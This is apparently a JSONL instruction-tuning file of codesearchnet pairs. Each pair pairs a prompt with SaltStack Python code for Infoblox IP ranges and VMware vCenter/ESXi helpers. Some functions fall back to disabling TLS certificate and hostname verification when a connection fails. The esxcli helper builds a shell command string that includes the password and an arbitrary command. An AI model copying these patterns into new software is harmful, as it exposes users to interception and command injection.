__salt__['infoblox.diff_objects'](data, obj)\n        if not diff:\n            ret['result'] = True\n            ret['comment'] = 'supplied fields in correct state'\n            return ret\n        if diff:\n            if __opts__['test']:\n                ret['result'] = None\n                ret['comment'] = 'would attempt to update record'\n                return ret\n            new_obj = __salt__['infoblox.update_object'](obj['_ref'], data=data, **api_opts)\n            ret['result'] = True\n            ret['comment'] = 'record fields updated'\n            ret['changes'] = {'diff': diff}\n            return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = 'would attempt to create record {0}'.format(name)\n        return ret\n\n    new_obj_ref = __salt__['infoblox.create_ipv4_range'](data, **api_opts)\n    new_obj = __salt__['infoblox.get_ipv4_range'](data['start_addr'], data['end_addr'], **api_opts)\n\n    ret['result'] = True\n    ret['comment'] = 'record created'\n    ret['changes'] = {'old': 'None', 'new': {'_ref': new_obj_ref, 'data': new_obj}}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nensure the specified resource is absent", "response": "def absent(name=None, start_addr=None, end_addr=None, data=None, **api_opts):\n    '''\n    Ensure the range is removed\n\n    Supplying the end of the range is optional.\n\n    State example:\n\n    .. code-block:: yaml\n\n        infoblox_range.absent:\n            - name: 'vlan10'\n\n        infoblox_range.absent:\n            - name:\n            - start_addr: 127.0.1.20\n    '''\n    ret = {'name': name, 'result': False, 'comment': '', 'changes': {}}\n\n    if not data:\n        data = {}\n    if 'name' not in data:\n        data.update({'name': name})\n    if 'start_addr' not in data:\n        data.update({'start_addr': start_addr})\n    if 'end_addr' not in data:\n        data.update({'end_addr': end_addr})\n\n    obj = __salt__['infoblox.get_ipv4_range'](data['start_addr'], data['end_addr'], **api_opts)\n    if obj is None:\n        obj = __salt__['infoblox.get_ipv4_range'](start_addr=data['start_addr'], end_addr=None, **api_opts)\n        if obj is None:\n            obj = __salt__['infoblox.get_ipv4_range'](start_addr=None, end_addr=data['end_addr'], **api_opts)\n\n    if not obj:\n        ret['result'] = True\n        ret['comment'] = 'already deleted'\n        return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = 'would attempt to delete range'\n        return ret\n\n    if __salt__['infoblox.delete_object'](objref=obj['_ref']):\n        ret['result'] = True\n        ret['changes'] = {'old': 'Found {0} - {1}'.format(start_addr, end_addr),\n                        'new': 'Removed'}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsend this command to the server and get the output and stderr.", "response": "def sendline(self, cmd):\n        '''\n        Send this command to the server and\n        return a tuple of the output and the stderr.\n\n        The format for parameters is:\n\n        cmd (string): The command to send to the sever.\n        '''\n        self.conn.sendline(cmd, self.linesep)\n\n        # saw_prompt = False\n        ret_stdout = []\n        ret_stderr = []\n        while self.conn.has_unread_data:\n            stdout, stderr = self.conn.recv()\n\n            if stdout:\n                ret_stdout.append(stdout)\n            if stderr:\n                log.debug('Error while executing command.')\n                ret_stderr.append(stderr)\n\n            if stdout and self.prompt_re.search(stdout):\n                break\n\n        return ''.join(ret_stdout), ''.join(ret_stderr)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nshell out and call the specified ESXCLI commmand parse the result and return something sane.", "response": "def esxcli(host, user, pwd, cmd, protocol=None, port=None, esxi_host=None, credstore=None):\n    '''\n    Shell out and call the specified esxcli commmand, parse the result\n    and return something sane.\n\n    :param host: ESXi or vCenter host to connect to\n    :param user: User to connect as, usually root\n    :param pwd: Password to connect with\n    :param port: TCP port\n    :param cmd: esxcli command and arguments\n    :param esxi_host: If `host` is a vCenter host, then esxi_host is the\n                      ESXi machine on which to execute this command\n    :param credstore: Optional path to the credential store file\n\n    :return: Dictionary\n    '''\n\n    esx_cmd = salt.utils.path.which('esxcli')\n    if not esx_cmd:\n        log.error('Missing dependency: The salt.utils.vmware.esxcli function requires ESXCLI.')\n        return False\n\n    # Set default port and protocol if none are provided.\n    if port is None:\n        port = 443\n    if protocol is None:\n        protocol = 'https'\n\n    if credstore:\n        esx_cmd += ' --credstore \\'{0}\\''.format(credstore)\n\n    if not esxi_host:\n        # Then we are connecting directly to an ESXi server,\n        # 'host' points at that server, and esxi_host is a reference to the\n        # ESXi instance we are manipulating\n        esx_cmd += ' -s {0} -u {1} -p \\'{2}\\' ' \\\n                   '--protocol={3} --portnumber={4} {5}'.format(host,\n                                                                user,\n                                                                pwd,\n                                                                protocol,\n                                                                port,\n                                                                cmd)\n    else:\n        esx_cmd += ' -s {0} -h {1} -u {2} -p \\'{3}\\' ' \\\n                   '--protocol={4} --portnumber={5} {6}'.format(host,\n                                                                esxi_host,\n                                                                user,\n                                                                pwd,\n                                                                protocol,\n                                                                port,\n                                                                cmd)\n\n    ret = salt.modules.cmdmod.run_all(esx_cmd, output_loglevel='quiet')\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_service_instance(host, username, password, protocol,\n                          port, mechanism, principal, domain):\n    '''\n    Internal method to authenticate with a vCenter server or ESX/ESXi host\n    and return the service instance object.\n    '''\n    log.trace('Retrieving new service instance')\n    token = None\n    if mechanism == 'userpass':\n        if username is None:\n            raise salt.exceptions.CommandExecutionError(\n                'Login mechanism userpass was specified but the mandatory '\n                'parameter \\'username\\' is missing')\n        if password is None:\n            raise salt.exceptions.CommandExecutionError(\n                'Login mechanism userpass was specified but the mandatory '\n                'parameter \\'password\\' is missing')\n    elif mechanism == 'sspi':\n        if principal is not None and domain is not None:\n            try:\n                token = get_gssapi_token(principal, host, domain)\n            except Exception as exc:\n                raise salt.exceptions.VMwareConnectionError(six.text_type(exc))\n        else:\n            err_msg = 'Login mechanism \\'{0}\\' was specified but the' \\\n                      ' mandatory parameters are missing'.format(mechanism)\n            raise salt.exceptions.CommandExecutionError(err_msg)\n    else:\n        raise salt.exceptions.CommandExecutionError(\n            'Unsupported mechanism: \\'{0}\\''.format(mechanism))\n    try:\n        log.trace('Connecting using the \\'%s\\' mechanism, with username \\'%s\\'',\n                  mechanism, username)\n        service_instance = SmartConnect(\n            host=host,\n            user=username,\n            pwd=password,\n            protocol=protocol,\n            port=port,\n            b64token=token,\n            mechanism=mechanism)\n    except TypeError as exc:\n        if 'unexpected keyword argument' in exc.message:\n            log.error('Initial connect to the VMware endpoint failed with %s', exc.message)\n            log.error('This may mean that a version of PyVmomi EARLIER than 6.0.0.2016.6 is installed.')\n            log.error('We recommend updating to that version or later.')\n            raise\n    except Exception as exc:  # pylint: disable=broad-except\n        # pyVmomi's SmartConnect() actually raises Exception in some cases.\n        default_msg = 'Could not connect to host \\'{0}\\'. ' \\\n                      'Please check the debug log for more information.'.format(host)\n\n        try:\n            if (isinstance(exc, vim.fault.HostConnectFault) and\n                '[SSL: CERTIFICATE_VERIFY_FAILED]' in exc.msg) or \\\n               '[SSL: CERTIFICATE_VERIFY_FAILED]' in six.text_type(exc):\n                service_instance = SmartConnect(\n                    host=host,\n                    user=username,\n                    pwd=password,\n                    protocol=protocol,\n                    port=port,\n                    sslContext=getattr(ssl, '_create_unverified_context', getattr(ssl, '_create_stdlib_context'))(),\n                    b64token=token,\n                    mechanism=mechanism)\n            else:\n                log.exception(exc)\n                err_msg = exc.msg if hasattr(exc, 'msg') else default_msg\n                raise salt.exceptions.VMwareConnectionError(err_msg)\n        except Exception as exc:  # pylint: disable=broad-except\n            # pyVmomi's SmartConnect() actually raises Exception in some cases.\n            if 'certificate verify failed' in six.text_type(exc):\n                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\n                context.verify_mode = ssl.CERT_NONE\n                try:\n                    service_instance = SmartConnect(\n                        host=host,\n                        user=username,\n                        pwd=password,\n                        protocol=protocol,\n                        port=port,\n                        sslContext=context,\n                        b64token=token,\n                        mechanism=mechanism\n                    )\n                except Exception as exc:\n                    log.exception(exc)\n                    err_msg = exc.msg if hasattr(exc, 'msg') else six.text_type(exc)\n                    raise salt.exceptions.VMwareConnectionError(\n                        'Could not connect to host \\'{0}\\': '\n                        '{1}'.format(host, err_msg))\n            else:\n                err_msg = exc.msg if hasattr(exc, 'msg') else default_msg\n                log.trace(exc)\n                raise salt.exceptions.VMwareConnectionError(err_msg)\n    atexit.register(Disconnect, service_instance)\n    return service_instance", "response": "Internal method to authenticate with a vCenter server or ESXi server and return the service instance object."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets a reference to a VMware customization spec", "response": "def get_customizationspec_ref(si, customization_spec_name):\n    '''\n    Get a reference to a VMware customization spec for the purposes of customizing a clone\n\n    si\n        ServiceInstance for the vSphere or ESXi server (see get_service_instance)\n\n    customization_spec_name\n        Name of the customization spec\n\n    '''\n    customization_spec_name = si.content.customizationSpecManager.GetCustomizationSpec(name=customization_spec_name)\n    return customization_spec_name"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_service_instance(host, username=None, password=None, protocol=None,\n                         port=None, mechanism='userpass', principal=None,\n                         domain=None):\n    '''\n    Authenticate with a vCenter server or ESX/ESXi host and return the service instance object.\n\n    host\n        The location of the vCenter server or ESX/ESXi host.\n\n    username\n        The username used to login to the vCenter server or ESX/ESXi host.\n        Required if mechanism is ``userpass``\n\n    password\n        The password used to login to the vCenter server or ESX/ESXi host.\n        Required if mechanism is ``userpass``\n\n    protocol\n        Optionally set to alternate protocol if the vCenter server or ESX/ESXi host is not\n        using the default protocol. Default protocol is ``https``.\n\n    port\n        Optionally set to alternate port if the vCenter server or ESX/ESXi host is not\n        using the default port. Default port is ``443``.\n\n    mechanism\n        pyVmomi connection mechanism. Can either be ``userpass`` or ``sspi``.\n        Default mechanism is ``userpass``.\n\n    principal\n        Kerberos service principal. Required if mechanism is ``sspi``\n\n    domain\n        Kerberos user domain. Required if mechanism is ``sspi``\n    '''\n\n    if protocol is None:\n        protocol = 'https'\n    if port is None:\n        port = 443\n\n    service_instance = GetSi()\n    if service_instance:\n        stub = GetStub()\n        if (salt.utils.platform.is_proxy() or\n            (hasattr(stub, 'host') and\n             stub.host != ':'.join([host, six.text_type(port)]))):\n            # Proxies will fork and mess up the cached service instance.\n            # If this is a proxy or we are connecting to a different host\n            # invalidate the service instance to avoid a potential memory leak\n            # and reconnect\n            Disconnect(service_instance)\n            service_instance = None\n        else:\n            return service_instance\n\n    if not service_instance:\n        service_instance = _get_service_instance(host,\n                                                 username,\n                                                 password,\n                                                 protocol,\n                                                 port,\n                                                 mechanism,\n                                                 principal,\n                                                 domain)\n\n    # Test if data can actually be retrieved or connection has gone stale\n    log.trace('Checking connection is still authenticated')\n    try:\n        service_instance.CurrentTime()\n    except vim.fault.NotAuthenticated:\n        log.trace('Session no longer authenticating. Reconnecting')\n        Disconnect(service_instance)\n        service_instance = _get_service_instance(host,\n                                                 username,\n                                                 password,\n                                                 protocol,\n                                                 port,\n                                                 mechanism,\n                                                 principal,\n                                                 domain)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n\n    return service_instance", "response": "Authenticate with a vCenter server or ESXi host and return the service instance object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_new_service_instance_stub(service_instance, path, ns=None,\n                                  version=None):\n    '''\n    Returns a stub that points to a different path,\n    created from an existing connection.\n\n    service_instance\n        The Service Instance.\n\n    path\n        Path of the new stub.\n\n    ns\n        Namespace of the new stub.\n        Default value is None\n\n    version\n        Version of the new stub.\n        Default value is None.\n    '''\n    # For python 2.7.9 and later, the default SSL context has more strict\n    # connection handshaking rule. We may need turn off the hostname checking\n    # and the client side cert verification.\n    context = None\n    if sys.version_info[:3] > (2, 7, 8):\n        context = ssl.create_default_context()\n        context.check_hostname = False\n        context.verify_mode = ssl.CERT_NONE\n\n    stub = service_instance._stub\n    hostname = stub.host.split(':')[0]\n    session_cookie = stub.cookie.split('\"')[1]\n    VmomiSupport.GetRequestContext()['vcSessionCookie'] = session_cookie\n    new_stub = SoapStubAdapter(host=hostname,\n                               ns=ns,\n                               path=path,\n                               version=version,\n                               poolSize=0,\n                               sslContext=context)\n    new_stub.cookie = stub.cookie\n    return new_stub", "response": "Returns a new SOAP stub that points to a different path ns and version."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the service instance from a managed object.", "response": "def get_service_instance_from_managed_object(mo_ref, name='<unnamed>'):\n    '''\n    Retrieves the service instance from a managed object.\n\n    me_ref\n        Reference to a managed object (of type vim.ManagedEntity).\n\n    name\n        Name of managed object. This field is optional.\n    '''\n    if not name:\n        name = mo_ref.name\n    log.trace('[%s] Retrieving service instance from managed object', name)\n    si = vim.ServiceInstance('ServiceInstance')\n    si._stub = mo_ref._stub\n    return si"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndisconnects from the vCenter server or ESXi host or ESXi managed object references.", "response": "def disconnect(service_instance):\n    '''\n    Function that disconnects from the vCenter server or ESXi host\n\n    service_instance\n        The Service Instance from which to obtain managed object references.\n    '''\n    log.trace('Disconnecting')\n    try:\n        Disconnect(service_instance)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns information of the vCenter or ESXi host managed object references.", "response": "def get_service_info(service_instance):\n    '''\n    Returns information of the vCenter or ESXi host\n\n    service_instance\n        The Service Instance from which to obtain managed object references.\n    '''\n    try:\n        return service_instance.content.about\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a reference to a Distributed Virtual Switch object.", "response": "def _get_dvs(service_instance, dvs_name):\n    '''\n    Return a reference to a Distributed Virtual Switch object.\n\n    :param service_instance: PyVmomi service instance\n    :param dvs_name: Name of DVS to return\n    :return: A PyVmomi DVS object\n    '''\n    switches = list_dvs(service_instance)\n    if dvs_name in switches:\n        inventory = get_inventory(service_instance)\n        container = inventory.viewManager.CreateContainerView(inventory.rootFolder, [vim.DistributedVirtualSwitch], True)\n        for item in container.view:\n            if item.name == dvs_name:\n                return item\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a portgroup object corresponding to the portgroup name on the dvs object", "response": "def _get_dvs_portgroup(dvs, portgroup_name):\n    '''\n    Return a portgroup object corresponding to the portgroup name on the dvs\n\n    :param dvs: DVS object\n    :param portgroup_name: Name of portgroup to return\n    :return: Portgroup object\n    '''\n    for portgroup in dvs.portgroup:\n        if portgroup.name == portgroup_name:\n            return portgroup\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_dvs_uplink_portgroup(dvs, portgroup_name):\n    '''\n    Return a portgroup object corresponding to the portgroup name on the dvs\n\n    :param dvs: DVS object\n    :param portgroup_name: Name of portgroup to return\n    :return: Portgroup object\n    '''\n    for portgroup in dvs.portgroup:\n        if portgroup.name == portgroup_name:\n            return portgroup\n\n    return None", "response": "Returns a portgroup object corresponding to the portgroup name on the dvs object"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the gssapi token for a Kerberos connection", "response": "def get_gssapi_token(principal, host, domain):\n    '''\n    Get the gssapi token for Kerberos connection\n\n    principal\n       The service principal\n    host\n       Host url where we would like to authenticate\n    domain\n       Kerberos user domain\n    '''\n\n    if not HAS_GSSAPI:\n        raise ImportError('The gssapi library is not imported.')\n\n    service = '{0}/{1}@{2}'.format(principal, host, domain)\n    log.debug('Retrieving gsspi token for service %s', service)\n    service_name = gssapi.Name(service, gssapi.C_NT_USER_NAME)\n    ctx = gssapi.InitContext(service_name)\n    in_token = None\n    while not ctx.established:\n        out_token = ctx.step(in_token)\n        if out_token:\n            if six.PY2:\n                return base64.b64encode(out_token)\n            return base64.b64encode(salt.utils.stringutils.to_bytes(out_token))\n        if ctx.established:\n            break\n        if not in_token:\n            raise salt.exceptions.CommandExecutionError(\n                'Can\\'t receive token, no response from server')\n    raise salt.exceptions.CommandExecutionError(\n        'Context established, but didn\\'t receive token')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the hardware grains for the specified service instance.", "response": "def get_hardware_grains(service_instance):\n    '''\n    Return hardware info for standard minion grains if the service_instance is a HostAgent type\n\n    service_instance\n        The service instance object to get hardware info for\n\n    .. versionadded:: 2016.11.0\n    '''\n    hw_grain_data = {}\n    if get_inventory(service_instance).about.apiType == 'HostAgent':\n        view = service_instance.content.viewManager.CreateContainerView(service_instance.RetrieveContent().rootFolder,\n                                                                        [vim.HostSystem], True)\n        if view and view.view:\n            hw_grain_data['manufacturer'] = view.view[0].hardware.systemInfo.vendor\n            hw_grain_data['productname'] = view.view[0].hardware.systemInfo.model\n\n            for _data in view.view[0].hardware.systemInfo.otherIdentifyingInfo:\n                if _data.identifierType.key == 'ServiceTag':\n                    hw_grain_data['serialnumber'] = _data.identifierValue\n\n            hw_grain_data['osfullname'] = view.view[0].summary.config.product.fullName\n            hw_grain_data['osmanufacturer'] = view.view[0].summary.config.product.vendor\n            hw_grain_data['osrelease'] = view.view[0].summary.config.product.version\n            hw_grain_data['osbuild'] = view.view[0].summary.config.product.build\n            hw_grain_data['os_family'] = view.view[0].summary.config.product.name\n            hw_grain_data['os'] = view.view[0].summary.config.product.name\n            hw_grain_data['mem_total'] = view.view[0].hardware.memorySize /1024/1024\n            hw_grain_data['biosversion'] = view.view[0].hardware.biosInfo.biosVersion\n            hw_grain_data['biosreleasedate'] = view.view[0].hardware.biosInfo.releaseDate.date().strftime('%m/%d/%Y')\n            hw_grain_data['cpu_model'] = view.view[0].hardware.cpuPkg[0].description\n            hw_grain_data['kernel'] = view.view[0].summary.config.product.productLineId\n            hw_grain_data['num_cpu_sockets'] = view.view[0].hardware.cpuInfo.numCpuPackages\n            hw_grain_data['num_cpu_cores'] = view.view[0].hardware.cpuInfo.numCpuCores\n            hw_grain_data['num_cpus'] = hw_grain_data['num_cpu_sockets'] * hw_grain_data['num_cpu_cores']\n            hw_grain_data['ip_interfaces'] = {}\n            hw_grain_data['ip4_interfaces'] = {}\n            hw_grain_data['ip6_interfaces'] = {}\n            hw_grain_data['hwaddr_interfaces'] = {}\n            for _vnic in view.view[0].configManager.networkSystem.networkConfig.vnic:\n                hw_grain_data['ip_interfaces'][_vnic.device] = []\n                hw_grain_data['ip4_interfaces'][_vnic.device] = []\n                hw_grain_data['ip6_interfaces'][_vnic.device] = []\n\n                hw_grain_data['ip_interfaces'][_vnic.device].append(_vnic.spec.ip.ipAddress)\n                hw_grain_data['ip4_interfaces'][_vnic.device].append(_vnic.spec.ip.ipAddress)\n                if _vnic.spec.ip.ipV6Config:\n                    hw_grain_data['ip6_interfaces'][_vnic.device].append(_vnic.spec.ip.ipV6Config.ipV6Address)\n                hw_grain_data['hwaddr_interfaces'][_vnic.device] = _vnic.spec.mac\n            hw_grain_data['host'] = view.view[0].configManager.networkSystem.dnsConfig.hostName\n            hw_grain_data['domain'] = view.view[0].configManager.networkSystem.dnsConfig.domainName\n            hw_grain_data['fqdn'] = '{0}{1}{2}'.format(\n                view.view[0].configManager.networkSystem.dnsConfig.hostName,\n                ('.' if view.view[0].configManager.networkSystem.dnsConfig.domainName else ''),\n                view.view[0].configManager.networkSystem.dnsConfig.domainName)\n\n            for _pnic in view.view[0].configManager.networkSystem.networkInfo.pnic:\n                hw_grain_data['hwaddr_interfaces'][_pnic.device] = _pnic.mac\n\n            hw_grain_data['timezone'] = view.view[0].configManager.dateTimeSystem.dateTimeInfo.timeZone.name\n        view = None\n    return hw_grain_data"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the root folder of a vCenter.", "response": "def get_root_folder(service_instance):\n    '''\n    Returns the root folder of a vCenter.\n\n    service_instance\n        The Service Instance Object for which to obtain the root folder.\n    '''\n    try:\n        log.trace('Retrieving root folder')\n        return service_instance.RetrieveContent().rootFolder\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_content(service_instance, obj_type, property_list=None,\n                container_ref=None, traversal_spec=None,\n                local_properties=False):\n    '''\n    Returns the content of the specified type of object for a Service Instance.\n\n    For more information, please see:\n    http://pubs.vmware.com/vsphere-50/index.jsp?topic=%2Fcom.vmware.wssdk.pg.doc_50%2FPG_Ch5_PropertyCollector.7.6.html\n\n    service_instance\n        The Service Instance from which to obtain content.\n\n    obj_type\n        The type of content to obtain.\n\n    property_list\n        An optional list of object properties to used to return even more filtered content results.\n\n    container_ref\n        An optional reference to the managed object to search under. Can either be an object of type Folder, Datacenter,\n        ComputeResource, Resource Pool or HostSystem. If not specified, default behaviour is to search under the inventory\n        rootFolder.\n\n    traversal_spec\n        An optional TraversalSpec to be used instead of the standard\n        ``Traverse All`` spec.\n\n    local_properties\n        Flag specifying whether the properties to be retrieved are local to the\n        container. If that is the case, the traversal spec needs to be None.\n    '''\n    # Start at the rootFolder if container starting point not specified\n    if not container_ref:\n        container_ref = get_root_folder(service_instance)\n\n    # By default, the object reference used as the starting poing for the filter\n    # is the container_ref passed in the function\n    obj_ref = container_ref\n    local_traversal_spec = False\n    if not traversal_spec and not local_properties:\n        local_traversal_spec = True\n        # We don't have a specific traversal spec override so we are going to\n        # get everything using a container view\n        try:\n            obj_ref = service_instance.content.viewManager.CreateContainerView(\n                container_ref, [obj_type], True)\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n\n        # Create 'Traverse All' traversal spec to determine the path for\n        # collection\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            name='traverseEntities',\n            path='view',\n            skip=False,\n            type=vim.view.ContainerView\n        )\n\n    # Create property spec to determine properties to be retrieved\n    property_spec = vmodl.query.PropertyCollector.PropertySpec(\n        type=obj_type,\n        all=True if not property_list else False,\n        pathSet=property_list\n    )\n\n    # Create object spec to navigate content\n    obj_spec = vmodl.query.PropertyCollector.ObjectSpec(\n        obj=obj_ref,\n        skip=True if not local_properties else False,\n        selectSet=[traversal_spec] if not local_properties else None\n    )\n\n    # Create a filter spec and specify object, property spec in it\n    filter_spec = vmodl.query.PropertyCollector.FilterSpec(\n        objectSet=[obj_spec],\n        propSet=[property_spec],\n        reportMissingObjectsInResults=False\n    )\n\n    # Retrieve the contents\n    try:\n        content = service_instance.content.propertyCollector.RetrieveContents([filter_spec])\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n\n    # Destroy the object view\n    if local_traversal_spec:\n        try:\n            obj_ref.Destroy()\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n\n    return content", "response": "Returns the content of the specified type of object for a Service Instance."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_mor_by_property(service_instance, object_type, property_value, property_name='name', container_ref=None):\n    '''\n    Returns the first managed object reference having the specified property value.\n\n    service_instance\n        The Service Instance from which to obtain managed object references.\n\n    object_type\n        The type of content for which to obtain managed object references.\n\n    property_value\n        The name of the property for which to obtain the managed object reference.\n\n    property_name\n        An object property used to return the specified object reference results. Defaults to ``name``.\n\n    container_ref\n        An optional reference to the managed object to search under. Can either be an object of type Folder, Datacenter,\n        ComputeResource, Resource Pool or HostSystem. If not specified, default behaviour is to search under the inventory\n        rootFolder.\n    '''\n    # Get list of all managed object references with specified property\n    object_list = get_mors_with_properties(service_instance, object_type, property_list=[property_name], container_ref=container_ref)\n\n    for obj in object_list:\n        obj_id = six.text_type(obj.get('object', '')).strip('\\'\"')\n        if obj[property_name] == property_value or property_value == obj_id:\n            return obj['object']\n\n    return None", "response": "Returns the first managed object reference having the specified property value."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list containing properties and managed object references for the given service instance object type and property list.", "response": "def get_mors_with_properties(service_instance, object_type, property_list=None,\n                             container_ref=None, traversal_spec=None,\n                             local_properties=False):\n    '''\n    Returns a list containing properties and managed object references for the managed object.\n\n    service_instance\n        The Service Instance from which to obtain managed object references.\n\n    object_type\n        The type of content for which to obtain managed object references.\n\n    property_list\n        An optional list of object properties used to return even more filtered managed object reference results.\n\n    container_ref\n        An optional reference to the managed object to search under. Can either be an object of type Folder, Datacenter,\n        ComputeResource, Resource Pool or HostSystem. If not specified, default behaviour is to search under the inventory\n        rootFolder.\n\n    traversal_spec\n        An optional TraversalSpec to be used instead of the standard\n        ``Traverse All`` spec\n\n    local_properties\n        Flag specigying whether the properties to be retrieved are local to the\n        container. If that is the case, the traversal spec needs to be None.\n    '''\n    # Get all the content\n    content_args = [service_instance, object_type]\n    content_kwargs = {'property_list': property_list,\n                      'container_ref': container_ref,\n                      'traversal_spec': traversal_spec,\n                      'local_properties': local_properties}\n    try:\n        content = get_content(*content_args, **content_kwargs)\n    except BadStatusLine:\n        content = get_content(*content_args, **content_kwargs)\n    except IOError as exc:\n        if exc.errno != errno.EPIPE:\n            raise exc\n        content = get_content(*content_args, **content_kwargs)\n\n    object_list = []\n    for obj in content:\n        properties = {}\n        for prop in obj.propSet:\n            properties[prop.name] = prop.val\n        properties['object'] = obj.obj\n        object_list.append(properties)\n    log.trace('Retrieved %s objects', len(object_list))\n    return object_list"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_properties_of_managed_object(mo_ref, properties):\n    '''\n    Returns specific properties of a managed object, retrieved in an\n    optimally.\n\n    mo_ref\n        The managed object reference.\n\n    properties\n        List of properties of the managed object to retrieve.\n    '''\n    service_instance = get_service_instance_from_managed_object(mo_ref)\n    log.trace('Retrieving name of %s', type(mo_ref).__name__)\n    try:\n        items = get_mors_with_properties(service_instance,\n                                         type(mo_ref),\n                                         container_ref=mo_ref,\n                                         property_list=['name'],\n                                         local_properties=True)\n        mo_name = items[0]['name']\n    except vmodl.query.InvalidProperty:\n        mo_name = '<unnamed>'\n    log.trace('Retrieving properties \\'%s\\' of %s \\'%s\\'',\n              properties, type(mo_ref).__name__, mo_name)\n    items = get_mors_with_properties(service_instance,\n                                     type(mo_ref),\n                                     container_ref=mo_ref,\n                                     property_list=properties,\n                                     local_properties=True)\n    if not items:\n        raise salt.exceptions.VMwareApiError(\n            'Properties of managed object \\'{0}\\' weren\\'t '\n            'retrieved'.format(mo_name))\n    return items[0]", "response": "Returns specific properties of a managed object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the network adapter type.", "response": "def get_network_adapter_type(adapter_type):\n    '''\n    Return the network adapter type.\n\n    adpater_type\n        The adapter type from which to obtain the network adapter type.\n    '''\n    if adapter_type == 'vmxnet':\n        return vim.vm.device.VirtualVmxnet()\n    elif adapter_type == 'vmxnet2':\n        return vim.vm.device.VirtualVmxnet2()\n    elif adapter_type == 'vmxnet3':\n        return vim.vm.device.VirtualVmxnet3()\n    elif adapter_type == 'e1000':\n        return vim.vm.device.VirtualE1000()\n    elif adapter_type == 'e1000e':\n        return vim.vm.device.VirtualE1000e()\n\n    raise ValueError('An unknown network adapter object type name.')"}
